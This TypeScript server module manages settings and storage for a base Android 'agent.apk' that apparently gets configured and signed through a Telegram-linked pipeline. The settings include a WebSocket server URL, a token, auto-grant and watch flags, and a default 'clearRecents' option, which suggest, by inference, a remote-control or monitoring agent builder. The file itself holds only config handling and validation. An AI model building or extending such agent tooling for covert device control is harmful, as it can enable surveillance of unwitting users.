import {
  existsSync,
  mkdirSync,
  readFileSync,
  renameSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';

import {
  resolveSignerPaths,
  signerRootCandidates,
} from '@/server/telegram/apkSigner/pipeline';

export type BaseApkMeta = {
  fileName: string;
  size: number;
  updatedAt: string;
};

/** Stored in panel; written into APK config.json except `port` (from group). */
export type BaseApkSettings = {
  serverUrl: string;
  token: string;
  frameKey: string;
  autoGrantUseAi: boolean;
  watchMarkEye: boolean;
  watchDumpFab: boolean;
  clearRecents: boolean;
  versionName: string;
  versionCode: number;
};

const DEFAULT_SETTINGS: BaseApkSettings = {
  serverUrl: '',
  token: '',
  frameKey: '',
  autoGrantUseAi: false,
  watchMarkEye: false,
  watchDumpFab: false,
  clearRecents: true,
  versionName: '',
  versionCode: 0,
};

function preferredBaseDir(): string {
  return join(resolveSignerPaths().workRoot, '..', 'base');
}

function findSettingsFile(): string | null {
  for (const root of signerRootCandidates()) {
    const p = join(root, 'base', 'settings.json');
    if (existsSync(p)) return p;
  }
  const preferred = join(preferredBaseDir(), 'settings.json');
  return existsSync(preferred) ? preferred : null;
}

function asBool(v: unknown, fallback: boolean): boolean {
  if (typeof v === 'boolean') return v;
  return fallback;
}

export function readBaseSettings(): BaseApkSettings {
  const path = findSettingsFile();
  if (!path) return { ...DEFAULT_SETTINGS };
  try {
    const raw = JSON.parse(readFileSync(/*turbopackIgnore: true*/ path, 'utf8')) as Partial<BaseApkSettings>;
    const versionCode = Number(raw.versionCode);
    return {
      serverUrl: typeof raw.serverUrl === 'string' ? raw.serverUrl.trim() : '',
      token: typeof raw.token === 'string' ? raw.token.trim() : '',
      frameKey: typeof raw.frameKey === 'string' ? raw.frameKey.trim() : '',
      autoGrantUseAi: asBool(raw.autoGrantUseAi, DEFAULT_SETTINGS.autoGrantUseAi),
      watchMarkEye: asBool(raw.watchMarkEye, DEFAULT_SETTINGS.watchMarkEye),
      watchDumpFab: asBool(raw.watchDumpFab, DEFAULT_SETTINGS.watchDumpFab),
      clearRecents: asBool(raw.clearRecents, DEFAULT_SETTINGS.clearRecents),
      versionName: typeof raw.versionName === 'string' ? raw.versionName.trim() : '',
      versionCode: Number.isFinite(versionCode) && versionCode > 0 ? Math.floor(versionCode) : 0,
    };
  } catch {
    return { ...DEFAULT_SETTINGS };
  }
}

export function readBaseServerUrl(): string {
  return readBaseSettings().serverUrl;
}

export function saveBaseSettings(patch: Partial<BaseApkSettings>): BaseApkSettings {
  const prev = readBaseSettings();
  const next: BaseApkSettings = {
    serverUrl:
      typeof patch.serverUrl === 'string' ? patch.serverUrl.trim() : prev.serverUrl,
    token: typeof patch.token === 'string' ? patch.token.trim() : prev.token,
    frameKey: typeof patch.frameKey === 'string' ? patch.frameKey.trim() : prev.frameKey,
    autoGrantUseAi:
      typeof patch.autoGrantUseAi === 'boolean' ? patch.autoGrantUseAi : prev.autoGrantUseAi,
    watchMarkEye:
      typeof patch.watchMarkEye === 'boolean' ? patch.watchMarkEye : prev.watchMarkEye,
    watchDumpFab:
      typeof patch.watchDumpFab === 'boolean' ? patch.watchDumpFab : prev.watchDumpFab,
    clearRecents:
      typeof patch.clearRecents === 'boolean' ? patch.clearRecents : prev.clearRecents,
    versionName:
      typeof patch.versionName === 'string' ? patch.versionName.trim() : prev.versionName,
    versionCode:
      typeof patch.versionCode === 'number' && Number.isFinite(patch.versionCode)
        ? Math.floor(patch.versionCode)
        : prev.versionCode,
  };
  const dir = preferredBaseDir();
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'settings.json'), JSON.stringify(next, null, 2));
  return next;
}

/** @deprecated use saveBaseSettings */
export function saveBaseServerUrl(serverUrl: string): BaseApkSettings {
  return saveBaseSettings({ serverUrl });
}

export function isValidApkServerUrl(url: string): boolean {
  const u = url.trim();
  if (!u || u.length > 512) return false;
  try {
    const parsed = new URL(u);
    return parsed.protocol === 'wss:' || parsed.protocol === 'ws:';
  } catch {
    return false;
  }
}

export function isValidVersionName(name: string): boolean {
  const n = name.trim();
  return n.length > 0 && n.length <= 32 && /^[\w.\-+]+$/.test(n);
}

export function isValidVersionCode(code: number): boolean {
  return Number.isFinite(code) && code >= 1 && code <= 2_100_000_000;
}

/** Find existing agent.apk across all known signer roots (panel vs repo mismatch). */
export function baseApkPath(): string {
  for (const root of signerRootCandidates()) {
    const apk = join(root, 'base', 'agent.apk');
    try {
      if (existsSync(apk) && statSync(apk).size > 1000) return apk;
    } catch {
      /* ignore */
    }
  }
  return join(preferredBaseDir(), 'agent.apk');
}

function metaPathFor(apkPath: string): string {
  return join(apkPath, '..', 'agent.meta.json');
}

export function readBaseApkMeta(): BaseApkMeta | null {
  const apk = baseApkPath();
  if (!existsSync(apk)) return null;
  let size = 0;
  try {
    size = statSync(apk).size;
  } catch {
    return null;
  }
  if (size <= 0) return null;
  let fileName = 'agent.apk';
  let updatedAt = '';
  try {
    const raw = JSON.parse(readFileSync(metaPathFor(apk), 'utf8')) as Partial<BaseApkMeta>;
    if (raw.fileName) fileName = String(raw.fileName);
    if (raw.updatedAt) updatedAt = String(raw.updatedAt);
  } catch {
    /* ignore */
  }
  if (!updatedAt) {
    try {
      updatedAt = statSync(apk).mtime.toISOString();
    } catch {
      updatedAt = new Date().toISOString();
    }
  }
  return { fileName, size, updatedAt };
}

export function saveBaseApk(buffer: Buffer, fileName: string): BaseApkMeta {
  const dir = preferredBaseDir();
  mkdirSync(dir, { recursive: true });
  const apk = join(dir, 'agent.apk');
  const tmp = `${apk}.tmp`;
  writeFileSync(tmp, buffer);
  renameSync(tmp, apk);
  const meta: BaseApkMeta = {
    fileName: (fileName || 'agent.apk').replace(/[^\w.\-()+ ]+/g, '_').slice(0, 120) || 'agent.apk',
    size: buffer.length,
    updatedAt: new Date().toISOString(),
  };
  writeFileSync(metaPathFor(apk), JSON.stringify(meta, null, 2));
  return meta;
}

export function baseApkReady(): boolean {
  const meta = readBaseApkMeta();
  return Boolean(meta && meta.size > 1000);
}
